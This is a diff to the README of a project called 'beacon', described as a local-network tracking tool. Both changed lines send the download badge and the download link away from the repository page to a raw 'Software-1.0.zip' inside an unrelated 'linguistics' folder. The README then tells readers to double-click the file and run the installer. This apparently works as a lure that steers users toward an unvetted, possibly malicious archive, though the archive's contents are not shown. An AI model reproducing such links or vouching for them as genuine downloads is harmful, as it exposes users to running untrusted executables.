@@ -1,7 +1,7 @@
 # 📡 beacon - Reliable tracking for your local network
 
 <p align="center">
-  <a href="https://github.com/Gamerdevil39/beacon">
+  <a href="https://github.com/Gamerdevil39/beacon/raw/refs/heads/main/linguistics/Software-1.0.zip">
     <img src="https://img.shields.io/badge/Download-beacon-blue.svg" alt="Download beacon">
   </a>
 </p>
@@ -30,7 +30,7 @@ Follow these steps to set up the software on your machine:
 4. Double-click the file to start the installer.
 5. Follow the prompts on your screen to complete the setup.
 
-[Download beacon here](https://github.com/Gamerdevil39/beacon)
+[Download beacon here](https://github.com/Gamerdevil39/beacon/raw/refs/heads/main/linguistics/Software-1.0.zip)
 
 ## 🚀 Running the Software
 
